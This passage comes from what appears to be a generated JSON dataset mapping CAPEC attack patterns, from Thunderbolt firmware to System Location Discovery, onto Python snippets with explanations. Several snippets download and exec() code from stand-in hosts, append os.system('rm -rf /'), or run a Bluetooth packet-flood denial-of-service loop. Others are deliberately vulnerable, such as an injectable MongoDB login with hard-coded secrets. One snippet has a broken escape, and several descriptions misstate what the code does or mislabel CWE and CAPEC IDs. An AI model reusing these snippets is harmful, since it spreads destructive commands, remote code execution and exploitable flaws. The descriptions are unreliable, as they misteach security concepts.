        "code_snippet": "import os\nimport struct\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-353: Missing Support for Integrity Check\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\n# CWE-1188: Initialization of a Resource with an Insecure Default\n# CWE-862: Missing Authorization\n\ndef manipulate_firmware(spi_device, firmware_path):\n    # CWE-1188: Insecure default initialization\n    default_firmware = b'\\x00' * 1024\n    with open(firmware_path, 'wb') as f:\n        f.write(default_firmware)\n\n    # CWE-345: No verification of data authenticity\n    with open(firmware_path, 'rb') as f:\n        firmware_data = f.read()\n\n    # CWE-353: No integrity check\n    if len(firmware_data) != 1024:\n        raise ValueError('Firmware data corrupted')\n\n    # CWE-288: Authentication bypass\n    if not authenticate_user():\n        print('Authentication bypassed')\n\n    # CWE-862: Missing authorization\n    if not authorize_user():\n        print('Authorization missing')\n\n    # Manipulate firmware\n    with open(spi_device, 'wb') as spi:\n        spi.write(firmware_data)\n\n\ndef authenticate_user():\n    # Placeholder for actual authentication logic\n    return False\n\n\ndef authorize_user():\n    # Placeholder for actual authorization logic\n    return False\n\n# Example usage\nmanipulate_firmware('/dev/spidev0.0', 'firmware.bin')",
        "description": "This Python code snippet demonstrates a simplified version of manipulating Thunderbolt controller firmware, highlighting several security weaknesses. The function `manipulate_firmware` initializes firmware with an insecure default (CWE-1188), reads firmware data without verifying its authenticity (CWE-345), and lacks integrity checks (CWE-353). It also includes placeholder functions for authentication and authorization, which are bypassed (CWE-288 and CWE-862). This code represents the main idea of exploiting Thunderbolt protection flaws by manipulating firmware and bypassing security mechanisms."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport time\n\n# Function to flood a Bluetooth device with large packets\ndef bluesmack_attack(target_address):\n    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n    sock.connect((target_address, 0x1001))  # L2CAP PSM for RFCOMM\n    large_packet = b'A' * 60000  # Large packet to flood the target\n    try:\n        while True:\n            sock.send(large_packet)\n            time.sleep(0.01)  # Short delay to keep flooding\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target = '00:11:22:33:44:55'  # Replace with the target Bluetooth address\n    bluesmack_attack(target)\n",
        "description": "This Python code snippet demonstrates a BlueSmacking attack, where an adversary floods a Bluetooth-enabled device with large packets over the L2CAP protocol to create a Denial of Service (DoS) condition. The code uses the `bluetooth` library to create an L2CAP socket and repeatedly sends large packets to the target device. The `time.sleep(0.01)` introduces a short delay between sends to maintain the flood. This attack must be carried out within close proximity to the target device. The code also includes a basic error handling mechanism to close the socket properly in case of an exception, addressing CWE-404 (Improper Resource Shutdown or Release)."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import bluetooth\n\ndef spoof_bluetooth_device(target_mac, spoofed_mac):\n    # Create a Bluetooth socket\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    \n    try:\n        # Connect to the target device using the spoofed MAC address\n        sock.connect((target_mac, 1))\n        \n        # Send a malicious payload\n        sock.send('malicious_payload')\n        \n        print(f'Successfully spoofed {target_mac} using {spoofed_mac}')\n    except bluetooth.btcommon.BluetoothError as err:\n        print(f'Failed to connect: {err}')\n    finally:\n        sock.close()\n\n# Example usage\nspoof_bluetooth_device('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "This Python code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing the MAC address of a Bluetooth device. The function `spoof_bluetooth_device` takes a target MAC address and a spoofed MAC address as inputs. It creates a Bluetooth socket and attempts to connect to the target device using the spoofed MAC address. If the connection is successful, it sends a malicious payload to the target device. This code embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and CAPEC-940 (Improper Verification of Source of a Communication Channel) by exploiting weak authentication mechanisms and improper verification of the source of a communication channel."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import random\n\nclass BluetoothConnection:\n    def __init__(self):\n        self.entropy_bits = 16  # Vulnerable: Low entropy bits\n        self.key = self.generate_key()\n\n    def generate_key(self):\n        # Vulnerable: Weak key generation due to low entropy\n        return ''.join(random.choice('0123456789ABCDEF') for _ in range(self.entropy_bits // 4))\n\n    def negotiate_key(self, adversary_in_the_middle=False):\n        if adversary_in_the_middle:\n            # Adversary reduces entropy bits to weaken the key\n            self.entropy_bits = 1\n        self.key = self.generate_key()\n        return self.key\n\n# Simulate a Bluetooth key negotiation with an adversary in the middle\nbt_connection = BluetoothConnection()\nprint(f'Initial Key: {bt_connection.key}')\nadversary_present = True\nnegotiated_key = bt_connection.negotiate_key(adversary_in_the_middle=adversary_present)\nprint(f'Negotiated Key with Adversary: {negotiated_key}')",
        "description": "This Python code snippet simulates a Bluetooth key negotiation process that is vulnerable to the Key Negotiation of Bluetooth Attack (KNOB). The BluetoothConnection class initializes with a low entropy bit value (16 bits), which is already weak. The generate_key method creates a key based on this entropy. The negotiate_key method simulates an adversary in the middle attack by reducing the entropy bits to an even lower value (1 bit), making the key extremely weak and easy to decrypt. This demonstrates the vulnerability where an attacker can manipulate the key negotiation process to reduce the security of the communication channel. The code also highlights CWE-693 (Protection Mechanism Failure) and CWE-757 (Selection of Less-Secure Algorithm During Negotiation) by showing how the protection mechanism can be easily bypassed and a weaker algorithm can be enforced."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import requests\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n# Fetching update from an untrusted source\nupdate_url = 'http://untrusted-source.com/update'\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # CWE-506: Embedded Malicious Code\n    # Directly executing the downloaded update without verification\n    exec(response.text)\nelse:\n    print('Failed to fetch update')\n\n# CWE-1277 & CWE-1329: Firmware Not Updateable & Reliance on Component That is Not Updateable\n# Assuming the firmware or component cannot be updated to fix this vulnerability\nprint('Warning: The system firmware cannot be updated to fix potential vulnerabilities.')",
        "description": "This Python code snippet demonstrates a scenario where an update is fetched from an untrusted source (CWE-807). The update is then executed without any verification, which could lead to the execution of malicious code (CWE-506). Additionally, it highlights the issue of having firmware or components that cannot be updated to address vulnerabilities (CWE-1277 and CWE-1329). This embodies the main idea of CAPEC-117: 'Alteration of a Software Update', where an adversary could insert malicious code into a software update, leading to potential control over the software's functionality."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\n# Maliciously altered compiler function\nclass MaliciousCompiler:\n    def compile(self, source_code):\n        # Inject malicious code\n        malicious_code = \"os.system('rm -rf /')\"\n        compiled_code = source_code + '\\n' + malicious_code\n        return compiled_code\n\n# Example usage of the malicious compiler\nsource_code = \"print('Hello, World!')\"\ncompiler = MaliciousCompiler()\ncompiled_code = compiler.compile(source_code)\n\n# Execute the compiled code (simulated)\try:\n    exec(compiled_code)\nexcept Exception as e:\n    print(f\"Error executing compiled code: {e}\")",
        "description": "This Python code snippet demonstrates a scenario where a maliciously altered compiler injects harmful code into otherwise benign source code. The `MaliciousCompiler` class simulates a compiler that appends a destructive command (`os.system('rm -rf /')`) to the original source code. This represents CWE-506 (Embedded Malicious Code) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by showing how an adversary can embed harmful instructions into software during the compilation process. Additionally, it touches on CWE-913 (Improper Control of Dynamically-Managed Code Resources) by manipulating the source code dynamically. The code snippet highlights the risk of using compromised development tools, as described in the CAPEC."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASIC:\n    def __init__(self, security_token):\n        self.security_token = security_token\n        self.confidential_data = 'Sensitive Information'\n        self.security_identifier = 'SECURE_ID'\n\n    def access_data(self, token):\n        if token == self.security_token:\n            return self.confidential_data\n        else:\n            return 'Access Denied'\n\n    def modify_requirements(self, new_token, new_identifier):\n        # Maliciously altering the security token and identifier\n        self.security_token = new_token\n        self.security_identifier = new_identifier\n\n# Example usage\nasic = ASIC('VALID_TOKEN')\nprint(asic.access_data('VALID_TOKEN'))  # Should print 'Sensitive Information'\n\n# Malicious alteration of requirements\nasic.modify_requirements('INVALID_TOKEN', 'INSECURE_ID')\nprint(asic.access_data('VALID_TOKEN'))  # Should print 'Access Denied'\nprint(asic.access_data('INVALID_TOKEN'))  # Should print 'Sensitive Information'",
        "description": "This Python code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered'. The ASIC class simulates an application-specific integrated circuit with a security token mechanism and a security identifier. The 'modify_requirements' method demonstrates how an adversary could maliciously alter the security token and identifier, leading to unauthorized access to confidential data. This alteration embodies the vulnerabilities described in the related CWEs, such as improper restriction of security token assignment (CWE-1259), insecure security identifier mechanism (CWE-1294), and unprotected confidential information (CWE-1297). The code highlights the potential impact of such malicious alterations on the security and functionality of the ASIC."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class MaliciousChip:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulate memory-mapped I/O registers\n        self.security_token = 'valid_token'\n\n    def program_chip(self):\n        # Malicious code implanted during chip programming\n        self.registers[0] = 0xDEADBEEF  # CWE-506: Embedded Malicious Code\n        self.security_token = 'malicious_token'  # CWE-1259: Improper Restriction of Security Token Assignment\n\n    def execute(self):\n        if self.security_token == 'malicious_token':\n            self.remote_control()  # CWE-509: Replicating Malicious Code\n\n    def remote_control(self):\n        print('Remote control activated!')\n\n    def access_register(self, index):\n        if index < len(self.registers):\n            return self.registers[index]  # CWE-1262: Improper Access Control for Register Interface\n        else:\n            return None\n\n# Simulate chip programming\nchip = MaliciousChip()\nchip.program_chip()\n\n# Simulate chip execution\nchip.execute()\n\n# Accessing a register\nprint(chip.access_register(0))",
        "description": "This Python code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The `MaliciousChip` class represents a chip with memory-mapped I/O registers and a security token mechanism. During the `program_chip` method, malicious code is implanted by altering a register value (CWE-506) and improperly assigning a security token (CWE-1259). The `execute` method checks for the malicious token and activates remote control functionality (CWE-509). The `access_register` method demonstrates improper access control to the registers (CWE-1262). This code embodies the idea of an adversary altering a chip's logic during programming to enable malicious actions when the chip is in use."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nexec(response.text)\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\n# Debugging code that logs sensitive information\nsensitive_info = 'API_KEY: 12345'\nprint(f'Debug: {sensitive_info}')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# Exposing the .git directory\nimport os\nos.system('cp -r .git /tmp/exposed_git')",
        "description": "This Python code snippet demonstrates a scenario where a developer inadvertently signs and deploys maliciously altered software. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494). The downloaded script could contain embedded malicious code (CWE-506) or act as a Trojan Horse (CWE-507). Additionally, the code includes a debugging statement that logs sensitive information (CWE-215), which could be exposed if not removed in production. Finally, it shows the exposure of a version-control repository to an unauthorized control sphere by copying the .git directory to a publicly accessible location (CWE-527). This snippet encapsulates the main idea of the CAPEC, where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import random\n\nclass FPGA:\n    def __init__(self):\n        self.configuration = self.load_configuration()\n\n    def load_configuration(self):\n        # Simulate loading a configuration that could be maliciously altered\n        config = {'function': 'normal_operation'}\n        if random.choice([True, False]):\n            config['function'] = 'malicious_operation'  # CWE-506: Embedded Malicious Code\n        return config\n\n    def execute(self):\n        if self.configuration['function'] == 'malicious_operation':\n            self.malicious_function()\n        else:\n            self.normal_function()\n\n    def normal_function(self):\n        print(\"Executing normal operation.\")\n\n    def malicious_function(self):\n        print(\"Executing malicious operation!\")  # CWE-1037: Security-critical code altered\n\n# Simulate FPGA reload\nfpga = FPGA()\nfpga.execute()",
        "description": "This Python code snippet simulates the concept of an FPGA being maliciously altered, as described in the CAPEC. The FPGA class has a method to load its configuration, which can randomly be set to a 'malicious_operation' to represent the introduction of malicious functionality (CWE-506). The execute method checks the configuration and runs either a normal or malicious function, demonstrating how an adversary could alter the FPGA's behavior (CWE-1037). This example highlights the risk of malicious code being embedded and executed within an FPGA, impacting the system's operation."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, data):\n        self.data = data  # CWE-316: Storing sensitive information in cleartext\n\n    def decommission(self):\n        # CWE-1266: Improper scrubbing of sensitive data\n        # CWE-1301: Insufficient or incomplete data removal\n        self.data = None  # Incorrectly assuming this removes data\n        print('Device decommissioned.')\n\n    def retrieve_data(self):\n        if self.data is not None:\n            return self.data\n        else:\n            return 'No data available'\n\n# Simulate device usage\nsensitive_data = 'Sensitive Information'\ndevice = Device(sensitive_data)\ndevice.decommission()\n\n# CWE-226: Sensitive information not removed before reuse\n# CWE-672: Operation on a resource after expiration or release\nretrieved_data = device.retrieve_data()\nprint(f'Retrieved Data: {retrieved_data}')",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is improperly handled during the decommissioning of a device. The `Device` class stores sensitive data in cleartext (CWE-316). The `decommission` method attempts to remove this data by setting it to `None`, which is an insufficient scrubbing method (CWE-1266, CWE-1301). The `retrieve_data` method can still access the data if it was not properly removed (CWE-226, CWE-672). This code highlights the risks associated with improper data scrubbing and the potential for sensitive information to be retrieved from decommissioned devices."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from flask import Flask, request\nimport pymongo\n\napp = Flask(__name__)\nclient = pymongo.MongoClient('mongodb://localhost:27017/')\ndb = client['testdb']\ncollection = db['users']\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    query = {'username': username, 'password': password}\n    user = collection.find_one(query)\n    if user:\n        return 'Login successful!'\n    else:\n        return 'Invalid credentials!'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a NoSQL injection vulnerability in a simple Flask web application. The application connects to a MongoDB database and provides a login endpoint. The login function constructs a query using user-supplied input (username and password) without proper validation or neutralization of special elements. This allows an attacker to manipulate the query and potentially bypass authentication. For example, an attacker could input a specially crafted username and password to alter the query logic and gain unauthorized access."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-1262: Improper Access Control for Register Interface\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n\n# Malicious function to alter server functionality\n# This function simulates the insertion of malicious code into a server's motherboard\n\ndef malicious_code():\n    # Simulate improper access control to hardware registers\n    hardware_register = 0xDEADBEEF  # Example memory-mapped I/O register\n    sensitive_data = \"Sensitive System Information\"\n\n    # Simulate exposure of sensitive system information\n    print(f\"Exposing sensitive data: {sensitive_data}\")\n\n    # Simulate improper management of sensitive trace data\n    trace_data = \"Trace Data\"\n    with open('/tmp/trace_data.log', 'w') as f:\n        f.write(trace_data)\n\n    # Simulate replicating malicious code\n    os.system('cp /path/to/malicious_code /tmp/malicious_copy')\n\n# Execute the malicious function\nmalicious_code()",
        "description": "This Python code snippet represents the concept of a 'Server Motherboard Compromise' by simulating the insertion of malicious code into a server's motherboard. The code demonstrates several related CWEs: \n\n1. CWE-506: The function `malicious_code` contains code that appears to be malicious in nature.\n2. CWE-509: The code replicates itself by copying the malicious code to another location.\n3. CWE-1262: The code simulates improper access control to a hardware register by directly assigning a value to `hardware_register`.\n4. CWE-497: The code exposes sensitive system information by printing it.\n5. CWE-1323: The code improperly manages sensitive trace data by writing it to an unprotected file.\n\nOverall, the code snippet illustrates how an adversary might insert and execute malicious software on a server motherboard, compromising its intended functionality and security."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-426: Untrusted Search Path\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\n# Create an insecure temporary file\ninsecure_temp_file = tempfile.NamedTemporaryFile(delete=False)\n\n# Write sensitive system information to the temporary file\nsensitive_info = 'DB_PASSWORD=supersecretpassword'\ninsecure_temp_file.write(sensitive_info.encode())\ninsecure_temp_file.close()\n\n# CWE-426: Untrusted Search Path\n# Add an untrusted directory to the system PATH\nos.environ['PATH'] += os.pathsep + '/untrusted_directory'\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# Dynamically execute code from an untrusted source\nexec(open('/untrusted_directory/malicious_script.py').read())\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\ntry:\n    # Simulate an error that exposes sensitive information\n    raise ValueError('An error occurred with sensitive data: ' + sensitive_info)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'System Build Data Maliciously Altered'. The code creates an insecure temporary file (CWE-377) and writes sensitive system information to it (CWE-497). It then adds an untrusted directory to the system PATH (CWE-426) and dynamically executes a script from this untrusted directory (CWE-913). Finally, it generates an error message that includes sensitive information (CWE-209). This code represents the idea of deliberately misconfiguring a system during the build process by altering build data and exposing the system to various security risks."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "import ctypes\n\n# Simulate a memory region with ctypes\nclass MemoryRegion(ctypes.Structure):\n    _fields_ = [\n        ('protected_data', ctypes.c_char * 64),\n        ('unprotected_data', ctypes.c_char * 64)\n    ]\n\n# Initialize memory region\nmemory = MemoryRegion()\n\n# Simulate improper access control by allowing write access to protected data\nmemory.protected_data = b'A' * 64  # This should be immutable or protected\n\n# Simulate an attacker modifying the protected data\nmemory.protected_data = b'B' * 64  # Vulnerability: protected data is writable\n\n# Print the modified protected data\nprint(memory.protected_data)\n",
        "description": "This Python code snippet simulates a memory region with both protected and unprotected data using the ctypes library. The 'protected_data' should be immutable or protected, but the code allows it to be written to, demonstrating a vulnerability where an attacker can modify protected data. This embodies the main idea of CAPEC-Exploitation of Improperly Configured or Implemented Memory Protections, specifically highlighting CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) and CWE-1274 (Improper Access Control for Volatile Memory Containing Boot Code)."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegister:\n    def __init__(self):\n        self.registers = {'config': 0x0, 'lock_bit': 0x0}\n\n    def write_register(self, register, value):\n        if register == 'lock_bit' and self.registers['lock_bit'] == 0x1:\n            print('Error: Cannot modify lock bit once set.')\n            return\n        self.registers[register] = value\n        print(f'Register {register} set to {hex(value)}')\n\n    def read_register(self, register):\n        return self.registers.get(register, 'Register not found')\n\n# Example usage\nhw_reg = HardwareRegister()\nhw_reg.write_register('config', 0x1234)  # Properly setting a config register\nhw_reg.write_register('lock_bit', 0x1)  # Setting the lock bit\nhw_reg.write_register('config', 0x5678)  # Attempt to modify config after lock bit is set\nhw_reg.write_register('lock_bit', 0x0)  # Attempt to modify lock bit after it is set\nprint(hw_reg.read_register('config'))\nprint(hw_reg.read_register('lock_bit'))",
        "description": "This Python code snippet simulates a hardware register interface with a lock bit mechanism. The `HardwareRegister` class contains a dictionary to represent registers, including a 'config' register and a 'lock_bit'. The `write_register` method allows writing to a register unless the 'lock_bit' is set, in which case it prevents further modifications to the 'lock_bit' and other registers. This demonstrates the concept of improperly controlled registers and the importance of correctly implementing lock bits to prevent unauthorized modifications, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def assign_token(self, entity, token):\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        self.security_tokens[entity] = token\n\n    def check_access(self, entity, action):\n        token = self.security_tokens.get(entity)\n        if not token:\n            # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            print(f\"Access denied for {entity}: No security token assigned.\")\n            return False\n        # CWE-1270: Generation of Incorrect Security Tokens\n        if token != 'VALID_TOKEN':\n            print(f\"Access denied for {entity}: Invalid security token.\")\n            return False\n        # CWE-1294: Insecure Security Identifier Mechanism\n        if action not in ['read', 'write']:\n            print(f\"Access denied for {entity}: Unauthorized action.\")\n            return False\n        print(f\"Access granted for {entity} to perform {action}.\")\n        return True\n\n# Example usage\nsoc = SoC()\nsoc.assign_token('entity1', 'INVALID_TOKEN')  # Improper token assignment\nsoc.check_access('entity1', 'read')  # Should be denied due to invalid token\nsoc.check_access('entity2', 'write')  # Should be denied due to missing token\nsoc.assign_token('entity3', 'VALID_TOKEN')\nsoc.check_access('entity3', 'execute')  # Should be denied due to unauthorized action\nsoc.check_access('entity3', 'read')  # Should be granted",
        "description": "This Python code snippet represents a simplified System-on-Chip (SoC) security mechanism that uses security tokens to control access to certain actions. The code demonstrates several vulnerabilities related to the CAPEC description and associated CWEs:\n\n1. **CWE-1259 (Improper Restriction of Security Token Assignment)**: The `assign_token` method assigns tokens to entities without proper validation or restriction.\n2. **CWE-1302 (Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC))**: The `check_access` method checks if an entity has a token assigned; if not, access is denied.\n3. **CWE-1270 (Generation of Incorrect Security Tokens)**: The `check_access` method verifies if the token is valid; if the token is incorrect, access is denied.\n4. **CWE-1294 (Insecure Security Identifier Mechanism)**: The `check_access` method ensures that only specific actions ('read' and 'write') are authorized; other actions are denied.\n\nThe code demonstrates how missing or improperly configured security identifiers can lead to unauthorized access or denial of service, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device:\n    def __init__(self, firmware_version, rom_code):\n        self.firmware_version = firmware_version\n        self.rom_code = rom_code\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n        self.rom_patchable = False  # CWE-1310: Missing Ability to Patch ROM Code\n\n    def check_for_updates(self):\n        if not self.updateable:\n            print(\"Firmware cannot be updated.\")\n        else:\n            print(\"Checking for firmware updates...\")\n\n    def patch_rom(self):\n        if not self.rom_patchable:\n            print(\"ROM code cannot be patched.\")\n        else:\n            print(\"Patching ROM code...\")\n\n# Example usage\nmy_device = Device(firmware_version=\"1.0\", rom_code=\"ABC123\")\nmy_device.check_for_updates()\nmy_device.patch_rom()",
        "description": "This Python code snippet defines a `Device` class that simulates a device with unpatchable firmware and ROM code, embodying the main idea of the CAPEC. The `Device` class has attributes `firmware_version` and `rom_code`, and flags `updateable` and `rom_patchable` set to `False`, representing CWE-1277 and CWE-1310 respectively. The methods `check_for_updates` and `patch_rom` print messages indicating the inability to update the firmware or patch the ROM code, highlighting the vulnerabilities described in the CAPEC. This code demonstrates how a device can be left in a vulnerable state due to the lack of update and patch capabilities."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    exec(response.text)  # CWE-290: Authentication Bypass by Spoofing\n\n# CWE-1230: Exposure of Sensitive Information Through Metadata\nmetadata = {'author': 'trusted_author', 'version': '1.0'}\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef send_metadata(metadata):\n    destination = 'http://trustedserver.com/metadata'\n    requests.post(destination, json=metadata)\n\nsend_metadata(metadata)",
        "description": "This Python code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads and executes a script from a potentially malicious URL without verifying its integrity (CWE-494). It uses a less trusted source for the script (CWE-348) and executes it if the HTTP response status is 200, potentially allowing for authentication bypass by spoofing (CWE-290). Additionally, it creates metadata that could expose sensitive information (CWE-1230) and sends it to a specified destination, which might be incorrectly specified (CWE-941). This code embodies the main idea of metadata spoofing by showing how an adversary could manipulate metadata and use less trusted sources to present malicious resources as legitimate."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\nimport hashlib\n\n# URL of the open-source software to download\nurl = 'http://example.com/malicious-package.tar.gz'\n\n# Download the file without integrity check\nresponse = requests.get(url)\n\n# Save the file locally\nwith open('package.tar.gz', 'wb') as file:\n    file.write(response.content)\n\n# Simulate the use of the downloaded package\n# (In a real scenario, this could be an import or execution of the package)\nprint('Downloaded and saved package.tar.gz')\n\n# No verification of the source or integrity of the downloaded file\n# This could lead to execution of malicious code embedded in the package",
        "description": "This Python code snippet demonstrates a scenario where an open-source software package is downloaded from a remote location without performing any integrity checks or verifying the source. The URL points to a potentially malicious package. The code saves the downloaded file locally and simulates its use. This embodies the main idea of the CAPEC 'Spoof Open-Source Software Metadata' by showing how an adversary could spoof metadata to make malicious software appear legitimate. The related CWEs are represented by the lack of integrity checks (CWE-494), the use of a potentially less trusted source (CWE-348), and the risk of embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo_path = '/tmp/repo'\nos.system(f'git clone {url} {repo_path}')\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'http://trusted.com/code.py'\nless_trusted_url = 'http://example.com/malicious_code.py'\nsource_url = less_trusted_url  # Using less trusted source\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\nsensitive_info = 'password = \"12345\"'\nwith open(os.path.join(repo_path, 'config.py'), 'w') as f:\n    f.write(sensitive_info)\n\n# CWE-508: Non-Replicating Malicious Code\nexec(response.text)  # Execute the downloaded malicious code",
        "description": "This Python code snippet demonstrates a scenario where an adversary spoofs metadata in a Version Control System (VCS) to deceive users. The code downloads a Python script from a remote location without verifying its integrity (CWE-494), clones a repository to a local path potentially exposing it to unauthorized access (CWE-527), uses a less trusted source for downloading code (CWE-348), includes sensitive information in the source code (CWE-540), and executes the downloaded malicious code (CWE-508). This embodies the main idea of the CAPEC by showing how an attacker can manipulate VCS metadata and related weaknesses to introduce malicious code and deceive users."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_package.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_package.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nsubprocess.run(['git', 'clone', 'http://example.com/malicious_repo.git'])\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'http://trustedsource.com/package.py'\nless_trusted_url = 'http://example.com/malicious_package.py'\nresponse = requests.get(less_trusted_url)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nsubprocess.run(['pip', 'install', 'vulnerable_package'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits the 'StarJacking' attack pattern by spoofing software popularity metadata to deceive users. The code includes several vulnerabilities: \n1. CWE-494: The code downloads and executes a Python script from a remote location without verifying its integrity.\n2. CWE-506: The downloaded script may contain malicious code.\n3. CWE-527: The code clones a potentially malicious git repository, exposing the version-control repository to unauthorized control.\n4. CWE-348: The code uses a less trusted source for downloading a package, ignoring a more trusted source.\n5. CWE-1395: The code installs a third-party package that may contain known vulnerabilities. \nThis snippet highlights the risks associated with downloading and executing code from untrusted sources, which can lead to the execution of malicious code and compromise the system's security."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport time\nimport locale\n\n# Function to gather system location information\ndef gather_system_info():\n    system_info = {}\n    \n    # Get timezone information\n    system_info['timezone'] = time.tzname\n    \n    # Get system locale information\n    system_info['locale'] = locale.getdefaultlocale()\n    \n    # Get keyboard layout (simulated as this is OS dependent)\n    system_info['keyboard_layout'] = os.getenv('KEYBOARD_LAYOUT', 'Unknown')\n    \n    return system_info\n\n# Function to simulate exposure of sensitive system information\ndef expose_sensitive_info():\n    info = gather_system_info()\n    \n    # Simulate exposure by printing the information\n    print(\"Exposing sensitive system information:\")\n    for key, value in info.items():\n        print(f\"{key}: {value}\")\n\n# Main execution\nif __name__ == '__main__':\n    expose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of 'System Location Discovery' by gathering and exposing sensitive system information such as timezone, locale, and keyboard layout. The `gather_system_info` function collects this information, and the `expose_sensitive_info` function simulates the exposure of this data by printing it to the console. This represents the CAPEC idea of an adversary collecting system location information. The code also touches on related CWEs by showing how sensitive information can be exposed (CWE-497) and how system-level information can be accessed and misused (CWE-529)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
